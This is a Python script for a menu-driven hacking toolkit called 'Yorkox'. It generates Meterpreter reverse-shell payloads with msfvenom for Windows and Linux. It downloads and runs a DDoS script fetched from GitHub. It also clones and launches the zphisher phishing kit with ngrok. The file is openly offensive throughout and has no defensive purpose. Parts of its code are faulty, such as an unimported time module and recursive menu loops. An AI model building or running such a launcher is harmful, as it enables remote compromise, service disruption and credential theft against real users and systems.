import os

#   <--Menu-->

print(chr(27)+"[1;31m"+"")

banner = """


    ██╗   ██╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗  ██╗
    ╚██╗ ██╔╝██╔═══██╗██╔══██╗██║ ██╔╝██╔═══██╗╚██╗██╔╝
     ╚████╔╝ ██║   ██║██████╔╝█████╔╝ ██║   ██║ ╚███╔╝
      ╚██╔╝  ██║   ██║██╔══██╗██╔═██╗ ██║   ██║ ██╔██╗
       ██║   ╚██████╔╝██║  ██║██║  ██╗╚██████╔╝██╔╝ ██╗
       ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
"""

def decoracion():
    print(chr(27)+"[1;35m"+"              |                    1 -->> MsfVenom")
    print("              |                    2 -->> DDoS")
    print("              |                    3 -->> Phishing")
    print("              |                    4 -->> Exit")
    #print("              |                    5 -->> Exit")

    option = input("              ↳ ")

    if option == "1":
        msf()

    if option == "2":
        ddos()

    if option == "3":
        phishing()

    if option == "4":
        os.system("clear")
        exit()

#   <--Return to Menu-->
def start_menu():
    os.system("clear")
    print(chr(27)+"[1;31m"+"")
    print(banner)
    decoracion()

#    <--Metasploit-->
def msf():
    os.system("clear")
    print(chr(27)+"[1;31m"+"")
    print(banner)
    print(chr(27)+"[1;35m"+"              |                    1 -->> Windows reverse shell")
    print("              |                    2 -->> Linux reverse shell x86")
    print("              |                    3 -->> Linux reverse shell x64")
    print("              |                    4 -->> Exit")
    x = input("              ↳ ")

    if x == "1":
        print(chr(27)+"[1;32m"+"")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > download.exe")
        print(chr(27)+"[1;31m"+"FileName == download.exe")
        while True:
            msf()

    if x == "2":
        print(chr(27)+"[1;32m"+"")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx86.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx86.elf")
        time.sleep(3)
        while True:
            msf()

    if x == "3":
        print(chr(27)+"[1;32m"+"")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx64.elf")
        print(chr(27)+"[1;31m"+"FileName == downloadx64.elf")
        while True:
            msf()

    if x == "4":
        start_menu()

#<--DDoS-->
def ddos():
    os.system("clear")
    print(chr(27)+"[1;31m"+"")
    print(banner)
    print(chr(27)+"[1;35m"+"              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        print("Downloading...")
        os.system("curl https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py -o ddos.py")
        print(chr(27)+"[1;31m"+"Download Succesfull!!")
        while True:
            ddos()

    if x == "2":
        print("")
        os.system("python3 ddos.py")

    if x == "3":
        start_menu()

#<--Phishing with zphisher-->
def phishing():
    os.system("clear")

    print(chr(27)+"[1;31m"+"")
    print(banner)
    print(chr(27)+"[1;35m"+"              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        print(chr(27)+"[1;32m"+"")
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        print("Downloading Ngrok...")
        os.system("curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -o unzip.zip")
        os.system("unzip unzip.zip")
        os.system("rm unzip.zip")
        while True:
            phishing()

    if x == "2":
        print("")
        print("Executting...")
        os.system("mv zphisher/.sites .")
        os.system("bash zphisher/zphisher.sh")

    if x == "3":
        start_menu()

#    <---Start the tool-->
start_menu()
